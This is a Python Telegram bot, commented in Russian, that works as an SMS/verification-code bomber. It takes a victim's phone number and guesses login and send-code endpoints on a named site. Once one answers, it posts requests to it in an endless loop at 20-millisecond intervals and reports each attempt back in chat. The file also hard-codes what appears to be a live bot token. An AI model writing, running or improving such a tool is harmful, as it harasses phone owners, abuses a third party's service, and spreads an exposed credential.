import asyncio
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

BASE_URL = "https://cabinet.presscode.app"
ENDPOINTS = [
    "/api/auth/telegram",
    "/api/login/telegram",
    "/api/send-code",
    "/api/request-code",
    "/api/v1/auth/telegram",
    "/api/register/telegram",
]

spam_tasks = {}
current_endpoint = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Отправь номер — бот сам переберёт возможные эндпоинты и начнёт долбить.\n"
        "Или задай вручную: /set_endpoint /api/ваш_путь"
    )

async def set_endpoint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_endpoint
    if not context.args:
        await update.message.reply_text("Укажи путь, например: /set_endpoint /api/send-code")
        return
    current_endpoint = context.args[0]
    await update.message.reply_text(f"Эндпоинт установлен: {current_endpoint}")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return

    endpoints_to_try = [current_endpoint] if current_endpoint else ENDPOINTS
    await update.message.reply_text(f"Запущено на {phone}. Пробую эндпоинты...")

    async def spam():
        nonlocal endpoints_to_try
        count = 0
        found = False
        async with aiohttp.ClientSession() as session:
            while True:
                for endpoint in endpoints_to_try:
                    url = BASE_URL + endpoint
                    try:
                        async with session.post(url, json={'phone': phone}, timeout=5) as resp:
                            status = resp.status
                            text = await resp.text()
                            count += 1
                            if status == 200 and ('success' in text.lower() or 'code' in text.lower()):
                                found = True
                                await context.bot.send_message(chat_id, f"✅ Найден рабочий эндпоинт: {endpoint}")
                                break
                            await context.bot.send_message(chat_id, f"Попытка #{count} на {endpoint}: {status}")
                    except Exception as e:
                        await context.bot.send_message(chat_id, f"Ошибка на {endpoint}: {str(e)[:30]}")
                    await asyncio.sleep(0.02)
                if found:
                    # Теперь долбим найденный эндпоинт
                    while True:
                        try:
                            async with session.post(BASE_URL + endpoint, json={'phone': phone}, timeout=5) as resp:
                                status = resp.status
                                text = await resp.text()
                                count += 1
                                await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:30]}")
                        except Exception as e:
                            await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
                        await asyncio.sleep(0.02)
                else:
                    await asyncio.sleep(1)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(CommandHandler("set_endpoint", set_endpoint))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
